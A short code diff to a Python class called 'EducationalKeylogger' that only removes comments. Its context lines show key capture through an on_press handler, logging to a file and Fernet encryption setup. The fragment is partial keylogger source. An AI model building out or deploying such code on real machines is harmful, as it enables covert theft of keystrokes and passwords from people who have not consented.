@@ -15,7 +15,6 @@ class EducationalKeylogger:
             self.key = Fernet.generate_key()
             self.cipher_suite = Fernet(self.key)
             
-        # Set up logging
         logging.basicConfig(
             filename=self.log_file,
             level=logging.INFO,
@@ -24,10 +23,9 @@ class EducationalKeylogger:
         
     def on_press(self, key):
         try:
-            # Handle alphanumeric keys
+
             char = key.char
         except AttributeError:
-            # Handle special keys
             char = str(key)
             
         log_entry = f"Key pressed: {char}"
